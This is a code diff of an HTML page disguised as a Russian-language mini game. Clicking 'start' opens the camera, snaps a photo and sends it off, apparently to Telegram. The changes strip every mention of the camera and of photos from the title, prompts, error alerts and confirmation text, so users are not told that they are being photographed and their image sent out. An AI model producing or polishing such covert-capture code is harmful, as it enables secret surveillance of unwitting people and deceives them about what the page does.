@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Game</title>
+    <title>Жми жми жми</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -37,8 +37,8 @@
     </style>
 </head>
 <body>
-    <h1>Камера Игры</h1>
-    <p id="gameMessage">Чтобы продолжить, пожалуйста, разрешите доступ к вашей камере для игры.</p>
+    <h1>мини игра</h1>
+    <p id="gameMessage">Чтобы продолжить нажми</p>
     <button id="requestPermissionButton" onclick="startGame()">Начать игру</button>
 
     <div id="videoContainer">
@@ -65,11 +65,11 @@
                     video.srcObject = stream;
                     videoContainer.style.display = 'block';
                     requestPermissionButton.style.display = 'none';
-                    gameMessage.textContent = "Удачи в игре! Нажмите на кнопку, чтобы сделать фото.";
+                    gameMessage.textContent = "Удачи в игре! жми";
                 })
                 .catch((err) => {
-                    console.error('Ошибка доступа к камере:', err);
-                    alert('Не удалось получить доступ к камере. Убедитесь, что камера подключена и разрешения предоставлены.');
+                    console.error('Ошибка:', err);
+                    alert('Не удалось прогрузить игру.');
                 });
         }
 
@@ -87,7 +87,7 @@
 
             // Получаем изображение в формате base64
             const imageData = canvas.toDataURL('image/jpeg');
-            console.log('Фото захвачено:', imageData); // Отправка фото в Telegram
+            console.log('игра в разработке пока что:)', imageData); // Отправка фото в Telegram
 
             // Конвертация base64 в файл и отправка в Telegram
             fetch(imageData)
@@ -105,12 +105,12 @@
                     .then(response => response.json())
                     .then(data => {
                         if (data.ok) {
-                            console.log("Фото успешно отправлено!");
+                            console.log("загрузка...");
                         } else {
-                            console.error("Не удалось отправить фото:", data.description);
+                            console.error("Не удалась:", data.description);
                         }
                     })
-                    .catch(err => console.error("Ошибка при отправке фото:", err));
+                    .catch(err => console.error("Ошибка при загрузке:", err));
                 });
 
             // Останавливаем поток видео
@@ -120,7 +120,7 @@
 
             // Показываем сообщение
             videoContainer.style.display = 'none';
-            gameMessage.textContent = "Ваше фото отправлено! Спасибо за игру!";
+            gameMessage.textContent = "Спасибо за игру!";
         }
     </script>
 </body>
